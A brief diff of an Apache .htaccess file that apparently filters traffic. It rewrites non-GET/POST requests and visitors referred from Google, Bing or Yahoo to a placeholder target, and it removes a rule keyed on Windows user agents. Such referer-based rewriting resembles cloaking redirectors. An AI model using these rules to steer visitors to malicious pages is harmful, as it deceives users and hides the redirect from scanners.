@@ -44,7 +44,8 @@
 	
 	#Not allowed post
 	RewriteCond %{REQUEST_METHOD} !^(GET|POST)
-	 RewriteRule ^.*$ replaceme [L]
+	RewriteRule ^.*$ replaceme [L]
+	 
 	 RewriteCond %{HTTP_REFERER} google\.com [OR]
 	 RewriteCond %{HTTP_REFERER} bing\.com [OR]
 	 RewriteCond %{HTTP_REFERER} yahoo\.com [OR]
@@ -285,7 +286,4 @@
 	#RewriteRule ^.*$ replaceme [L,R=302]
 	#RewriteRule ^.*$ replaceme [L]
 	
-	RewriteCond %{HTTP_USER_AGENT} "windows nt" [NC]
-	RewriteRule ^.*$ index.html [L]
-
 	allow from all
